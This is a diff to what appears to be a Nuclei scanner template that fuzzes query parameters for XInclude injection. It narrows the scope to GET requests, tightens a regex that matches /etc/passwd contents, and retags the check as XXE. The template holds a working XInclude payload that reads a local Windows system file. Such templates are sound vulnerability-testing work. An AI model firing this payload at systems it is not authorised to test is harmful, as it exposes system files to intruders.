@@ -3,13 +3,13 @@ http:
   - fuzz:
     - '{{xinc_fuzz}}'
     mode: multiple
-    part: request
+    part: query
     type: replace
   matchers:
   - name: linux
     part: body
     regex:
-    - 'root:.*?:[0-9]*:[0-9]*:'
+    - 'root:[^:]*:\d+:\d+:'
     type: regex
   - name: windows
     part: body
@@ -23,7 +23,7 @@ http:
     - <asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></asd>
   pre-condition:
   - dsl:
-    - method != "OPTIONS"
+    - method == "GET"
     type: dsl
   stop-at-first-match: true
 id: xinclude-injection
@@ -39,4 +39,4 @@ info:
   reference:
   - https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks
   severity: high
-  tags: fuzzing-req-query,xss,dast
+  tags: dast,xxe,xinclude,vuln
